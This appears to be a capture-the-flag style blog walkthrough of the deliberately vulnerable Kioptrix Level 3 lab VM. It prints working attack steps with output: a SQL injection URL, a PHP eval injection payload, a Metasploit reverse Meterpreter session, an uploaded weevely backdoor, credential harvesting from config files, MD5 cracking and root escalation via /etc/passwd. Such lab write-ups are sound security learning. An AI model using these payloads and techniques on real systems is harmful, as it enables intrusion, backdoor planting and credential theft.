---
layout: post
title: "Kioptrix: Level 3"
date: 2015-05-17 08:14:45 +0200
comments: true
categories: [vulnhub, kioptrix]
---
Image: [Kioptrix: Level 1.2 (#3)](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)

DHCP client is running on the image and we got assigned this IP address:
{% codeblock %}
$ tail -n 5 /var/db/vmware/vmnet-dhcpd-vmnet8.leases
lease 192.168.80.145 {
	starts 0 2015/05/17 06:14:07;
	ends 0 2015/05/17 06:44:07;
	hardware ethernet 00:0c:29:d6:3b:13;
}
{% endcodeblock %}

We add to '/etc/hosts':
{% codeblock %}
192.168.80.145 kioptrix3.com
{% endcodeblock %}

Nmap output:
{% codeblock %}
root@kali32:~# nmap kioptrix3.com -p- -sV

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-25 20:23 CEST
Nmap scan report for kioptrix3.com (192.168.80.145)
Host is up (0.00025s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:0C:29:D6:3B:13 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds
{% endcodeblock %}

Nikto output:
{% codeblock %}
root@kali32:/usr/share/exploitdb# nikto -h kioptrix3.com
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.80.145
+ Target Hostname:    kioptrix3.com
+ Target Port:        80
+ Start Time:         2015-04-25 20:44:13 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 21:22:00 2009
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.4.26)
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 6543 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2015-04-25 20:44:21 (GMT2) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endcodeblock %}

After browsing the web page, we can find several vulnerabilities.

SQL injection:
{% codeblock %}
http://kioptrix3.com/gallery/gallery.php?id=1%27
{% endcodeblock %}

Remote Code execution:
{% codeblock %}
POST /index.php HTTP/1.1
Host: kioptrix3.com
User-Agent: Mozilla
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=cd5a425d8b3a044f54c070eb10470ff1
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

page=index');eval(phpinfo());#
{% endcodeblock %}

The second one has a Metasploit module that we can use (for LotusCMS):
{% codeblock %}
msf > use exploit/multi/http/lcms_php_exec 
msf exploit(lcms_php_exec) > show options 

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf exploit(lcms_php_exec) > set RHOST kioptrix3.com
RHOST => kioptrix3.com
msf exploit(lcms_php_exec) > set URI /
URI => /
msf exploit(lcms_php_exec) > exploit 

[*] Started reverse handler on 192.168.80.137:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (40499 bytes) to 192.168.80.145
[*] Meterpreter session 1 opened (192.168.80.137:4444 -> 192.168.80.145:54507) at 2015-04-25 20:16:36 +0200
{% endcodeblock %}

We invoke a few commands to obtain the shell and upload weevely.
{% codeblock %}
meterpreter > sysinfo
Computer    : Kioptrix3
OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
Meterpreter : php/php

meterpreter > shell
Process 4662 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash

uname -a
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
{% endcodeblock %}

{% codeblock %}
root@kali32:~# weevely generate 1234
[generate.php] Backdoor file 'weevely.php' created with password '1234'

meterpreter > upload /root/weevely.php /home/www/kioptrix3.com/cache/
[*] uploading  : /root/weevely.php -> /home/www/kioptrix3.com/cache/
[*] uploaded   : /root/weevely.php -> /home/www/kioptrix3.com/cache//weevely.php

root@kali32:~# weevely http://kioptrix3.com/cache/weevely.php 1234

www-data@:/home/www/kioptrix3.com $ :audit.userfiles 
+--------------------------------+--------+----------+--+--+
| /home/loneferret/.bash_history | exists | readable |  |  |
| /home/loneferret/.ssh          | exists |          |  |  |
| /home/dreg/.profile            | exists | readable |  |  |
| /home/dreg/.bashrc             | exists | readable |  |  |
| /home/loneferret/.profile      | exists | readable |  |  |
| /home/dreg/.bash_logout        | exists | readable |  |  |
| /home/loneferret/.bash_logout  | exists | readable |  |  |
| /home/loneferret/.bashrc       | exists | readable |  |  |
+--------------------------------+--------+----------+--+--+

www-data@:/etc/apache2 $ cat /etc/apache2/conf.d/phpmyadmin.conf | grep htpasswd
AuthUserFile /etc/phpmyadmin/htpasswd.setup
                AuthUserFile /etc/phpmyadmin/htpasswd.setup
www-data@:/etc/apache2 $ cat /etc/phpmyadmin/htpasswd.setup
admin:*

www-data@:/home/www/kioptrix3.com $ cat gallery/gconfig.php
        $GLOBALS["gallarific_mysql_server"] = "localhost";
        $GLOBALS["gallarific_mysql_database"] = "gallery";
        $GLOBALS["gallarific_mysql_username"] = "root";
        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
{% endcodeblock %}

Now we can log to phpmyadmin (found for example by Nikto) with root / fuckeyou credentials:

We found the several interesting things:
{% codeblock %}
Browse gallarific_users: admin / n0t7t1k4
{% endcodeblock %}

In dev_accounts we have:
{% codeblock %}
dreg 0d3eccfb887aabd50f243b3f155c0f85 
loneferret 5badcaf789d3d1d09794d8f021f40f0e
{% endcodeblock %}

Using John The Ripper password cracker:
{% codeblock %}
root@kali32:~# cat pass 
loneferret:5badcaf789d3d1d09794d8f021f40f0e:::::::
dreg:0d3eccfb887aabd50f243b3f155c0f85:::::::
..
root@kali32:~# john pass --format=raw-md5 --show
loneferret:starwars:::::::
dreg:Mast3r:::::::

2 password hashes cracked, 0 left
{% endcodeblock %}

We log as loneferret user and after listing sudo -l we will see that the HT
Editor could be invoked. 

In editor running with the root privileges we change the /etc/passwd entry
according:
{% codeblock %}
dreg:x:0:0:Dreg Gevans,0,555-5566,:/home/dreg:/bin/bash                                                                             │
{% endcodeblock %}

We log in as dreg / Mast3r with root privileges and read the congratulation
file, there is some information about alternative solutions / exploits:
{% codeblock %}
root@Kioptrix3:/root# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS:
http://www.lotuscms.org

Gallery application:
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
{% endcodeblock %}
